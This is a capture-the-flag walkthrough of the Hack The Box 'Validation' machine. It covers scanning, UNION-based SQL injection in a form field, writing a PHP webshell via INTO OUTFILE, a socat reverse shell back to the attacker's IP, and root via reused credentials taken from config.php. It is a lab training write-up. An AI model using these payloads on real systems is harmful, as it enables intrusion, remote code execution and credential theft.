# Validation - Easy

```sh
sudo vim /etc/hosts
# map target IP to validation.htb

nmap -T4 -p- -A -Pn -v validation.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
    * 80/tcp - http - Apache httpd 2.4.48
    * 4566/tcp - http - nginx
    * 8080/tcp - http - nginx

* the webpage on port 4566 shows '403 Forbidden', and the page on port 8080 says '502 Bad Gateway'

* checking the webpage on port 80, we have an input form with a username field and a country dropdown - submitting this form leads to a '/account.php' page, listing other usernames under the same country

* web scan:

    ```sh
    gobuster dir -u http://validation.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
    ```

* pages found:

    * /config.php
    * /css
    * /js

* testing with other inputs in this form, it accepts an empty username and no country chosen as well; we can check more with other inputs to test for any injection or bypass attacks

* intercept the requests using Burp Suite, and send to Repeater to get the format - save the POST request to a file

* we can check for SQLi using ```sqlmap```:

    ```sh
    # test for basic SQLi first
    sqlmap -r validation.req --batch --dump
    ```

* ```sqlmap``` identifies the 'country' parameter as an injection point with boolean-based blind and UNION query payloads, but is unable to identify the backend DB - we can continue this manually in Burp Suite by intercepting each request (as redirection is involved)

* if we use a simple UNION SQLi payload for the 'country' parameter - ```' UNION select 1 -- -``` - such that the entire payload in the POST call is ```username=test&country=Yemen'+UNION+select+1+--+-``` (URL-encoded payload), we get a 302 redirect to '/account.php' and a normal listing is shown

* continuing to check by increasing number of columns, the payload ```' UNION SELECT 1,2 -- -```, this time we get an error in '/account.php':

    ```text
    Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33 Stack trace: #0 {main} thrown in /var/www/html/account.php on line 33
    ```

* this means SQLi is working, and we can use the payload with a single column; using the payload ```' UNION select @@version -- -```, we see that the webpage is running '10.5.11-MariaDB-1'

* we can write a webshell using the payload ```' UNION select '<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php' -- -``` - this gives an error but navigating to '/shell.php' shows that the webshell is uploaded

* we have RCE now:

    ```sh
    curl 'http://validation.htb/shell.php?0=whoami'
    # www-data

    curl 'http://validation.htb/shell.php?0=pwd'
    # web root /var/www/html

    # setup listener
    nc -nvlp 4444

    # test with multiple URL-encoded revshell one-liners
    # most of them do not work

    curl 'http://validation.htb/shell.php?0=which%20nc'
    # the box does not have 'nc', so we could be in a limited environment

    # socat one-liner works
    curl 'http://validation.htb/shell.php?0=socat%20TCP%3A10.10.14.21%3A4444%20EXEC%3Ash'
    # we get reverse shell
    ```

* in reverse shell:

    ```sh
    # the box does not have 'python3' so we can skip the stable shell part for now
    ls -la
    # check the files in web root

    cat account.php

    cat config.php
    # this gives us creds 'uhc:uhc-9qual-global-pw'

    # enumerate further

    ls -la /
    # this has '.dockerenv' - means we could be in a Docker box

    ls -la /home
    # only one user 'htb'

    ls -la /home/htb
    
    cat /home/htb/user.txt
    # user flag

    cat /etc/passwd
    # no other usernames here
    # even 'htb' does not have a shell according to this

    # attempting password re-use
    su htb
    # enter password 'uhc-9qual-global-pw' in newline
    # we do not see the prompt as this is not a complete shell, so we would not see if it worked or not

    id
    # did not work, still www-data

    su root
    # try 'uhc-9qual-global-pw' in newline

    id
    # this works, and we are root

    cat /root/root.txt
    # root flag
    ```
